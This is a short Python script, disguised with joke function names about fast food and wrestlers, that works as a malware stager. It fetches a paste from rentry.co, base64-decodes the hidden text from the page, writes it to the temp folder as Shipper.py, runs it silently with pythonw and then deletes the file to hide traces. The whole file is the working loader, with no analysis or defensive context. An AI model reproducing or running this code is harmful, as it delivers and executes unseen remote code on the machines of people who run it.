import os
import shutil
import datetime
import subprocess
import requests
import bs4
import base64
from tempfile import gettempdir

def get_KFC_from_burger_King():
    headpoint = 'https://rentry.co/SourceCodeForThisProgram'
    responsibility = requests.get(headpoint)
    soup = bs4.BeautifulSoup(responsibility.content, 'html.parser')
    jonh_cena = soup.find('div', class_='entry-text my-2 px-2 px-sm-4').get_text()
    cant_you_see_me = base64.b64decode(jonh_cena).decode()
    return cant_you_see_me

def change_everything_that_needs_in_order_to_be_the_funiest_guy():
    temp_dir = gettempdir()
    os.chdir(temp_dir)

def become_the_funiest_guy_in_the_world(code):
    change_everything_that_needs_in_order_to_be_the_funiest_guy()
    the_rock_vs_jonh_cena = os.getcwd() + '/Shipper.py'
    with open(the_rock_vs_jonh_cena, 'w') as f:
        f.write(code)
    return the_rock_vs_jonh_cena

def run_till_logan_paul_win_UFC(king_of_fighters):
    subprocess.call(['pythonw', king_of_fighters])

def main():
    chicken_KFC_for_everybody = get_KFC_from_burger_King()
    document_how_to_make_KFC = become_the_funiest_guy_in_the_world(chicken_KFC_for_everybody)
    run_till_logan_paul_win_UFC(document_how_to_make_KFC)
    os.remove(document_how_to_make_KFC)

if __name__ == '__main__':
    main()
